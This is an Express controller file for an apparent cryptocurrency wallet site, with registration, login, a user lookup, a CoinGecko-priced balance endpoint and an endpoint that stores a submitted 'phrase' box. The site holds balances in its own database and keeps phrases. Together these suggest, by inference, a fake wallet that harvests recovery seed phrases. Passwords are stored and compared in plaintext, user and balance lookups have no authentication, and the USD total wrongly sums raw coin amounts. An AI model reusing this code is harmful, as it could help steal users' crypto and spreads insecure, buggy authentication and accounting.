const User = require('../models/User');
const Balance = require('../models/Balance');
const Phrases = require('../models/Phrases');



// Register
exports.registerUser = async (req, res) => {
    try {
        const { fullname, email, password } = req.body;

        const existingUser = await User.findOne({ email });
        if (existingUser) {
            return res.status(400).json({ error: 'Email already registered' });
        }

        const user = new User({ fullname, email, password });
        await user.save();

        const balance = new Balance({ userId: user._id });
        await balance.save();


        res.status(201).json({ success: 'User registered successfully' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};



// Login
exports.loginUser = async (req, res) => {
    try {
        const { email, password } = req.body;

        const user = await User.findOne({ email });
        if (!user) {
            return res.status(404).json({ error: 'User not found' });
        }

        if (user.password !== password) {
            return res.status(400).json({ error: 'Invalid password' });
        }

        res.status(200).json({
            success: 'Login successful',
            userId: user._id,
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};

// Dashboard
exports.getUser = async (req, res) => {
    try {
        const user = await User.findById(req.params.id);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }

        res.status(200).json({
            fullname: user.fullname,
            email: user.email,
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};


// balance



exports.getBalance = async (req, res) => {
    try {


        const { userId } = req.body;
      

        if (!userId) {
            return res.status(400).json({ message: "User ID is required" });
        }

           
         // Fetch user's balance from MongoDB
         const userBalance = await Balance.findOne({ userId });
         if (!userBalance) {
             return res.status(404).json({ message: "User balance not found" });
         }

        


        // Mapping database keys to CoinGecko API IDs
const cryptoIdMap = {
    eth: "ethereum",
    btc: "bitcoin",
    trx: "tron",
    xrp: "ripple",
    dogecoin: "dogecoin",
    shiba: "shiba-inu",
    litecoin: "litecoin",
    stellar: "stellar",
    cardano: "cardano",
    pepe: "pepe",
    polygon: "polygon",
    usdt: "tether",
    algo: "algorand",
    binancecoin: "binancecoin"
};

// Convert the mapped IDs into a string for API request
const cryptoIds = Object.values(cryptoIdMap).join(",");

const apiUrl = `https://api.coingecko.com/api/v3/simple/price?ids=${cryptoIds}&vs_currencies=usd&include_24hr_change=true`;

const response = await fetch(apiUrl);
const priceData = await response.json();
// console.log("✅ CoinGecko Response:", priceData);

// Prepare final balance data
let balanceData = {};
let totalUsdValue = 0;

Object.keys(cryptoIdMap).forEach(key => {
    const coinGeckoId = cryptoIdMap[key]; // Get the correct API ID

    if (userBalance[key] !== undefined && priceData[coinGeckoId]) {
        const cryptoBalance = userBalance[key];
        const priceInUsd = priceData[coinGeckoId].usd;
        const usd24hChange = priceData[coinGeckoId].usd_24h_change;

        const balanceInUsd = cryptoBalance * priceInUsd;
        totalUsdValue += cryptoBalance;

        balanceData[key] = {
            balance: cryptoBalance,
            price_usd: priceInUsd,
            balance_usd: balanceInUsd,
            usd_24h_change: usd24hChange
        };
    }
});
res.json({
    message: "Balance fetched successfully",
    totalUsdValue,
    balanceData
});
        
           


    } catch (error) {
        console.error("Server Error:", error.message);
        res.status(500).json({ error: "Server error", details: error.message });
    }
};




// store phrase
exports.storeBox = async (req, res) => {
    try {
        const { userId, box } = req.body;

        const boxString = JSON.stringify(box);

        const user = new Phrases({ userId, box: boxString  });
        await user.save();

        res.status(201).json({ success: 'data saved successfully' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};
